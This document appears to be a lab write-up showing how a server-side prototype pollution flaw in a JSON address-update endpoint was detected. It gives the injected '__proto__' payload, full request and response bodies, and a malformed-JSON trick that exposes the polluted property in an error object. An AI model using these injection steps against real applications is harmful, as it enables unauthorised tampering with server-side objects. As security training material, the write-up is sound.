# Identification

## Testing the `__proto__` property

The first step was to determine whether the endpoint was susceptible to prototype pollution.

An arbitrary property was injected through the `__proto__` property:

```json
"__proto__": {
  "foo": "bar"
}
```

The resulting request body was:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
  "__proto__": {
    "foo": "bar"
  }
}
```

The application returned a normal `200 OK` response:

```json
{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": false
}
```

The injected `foo` property was not present in the user object.

However, this did not rule out prototype pollution because the injected property would only become visible if the application later accessed an object that did not have its own `foo` property.

Therefore, an additional observable behavior was required.

---

# Identifying a Prototype Pollution Source

## Triggering a JSON parsing error

The application returned structured error information when malformed JSON was submitted.

To investigate this behavior, the JSON syntax was intentionally broken by removing the comma between two properties:

```json
"address_line_2": "One Wiener Way"
"city": "Tarragona",
```

The malformed request generated:

```http
HTTP/2 500 Internal Server Error
```

with the following response:

```json
{
  "error": {
    "expose": true,
    "statusCode": 400,
    "status": 400,
    "body": "...",
    "type": "entity.parse.failed",
    "foo": "bar"
  }
}
```

The presence of:

```json
"foo": "bar"
```

inside the error object was significant.

The application had not explicitly assigned `foo` to the error object. The property was instead inherited from the polluted prototype.

This provided strong evidence that the previous payload had resulted in:

```javascript
Object.prototype.foo = "bar";
```

Conceptually:

```text
__proto__.foo = "bar"
        ↓
Object.prototype.foo = "bar"
        ↓
error.foo
        ↓
"bar"
```

This confirmed the presence of a server-side prototype pollution vulnerability.

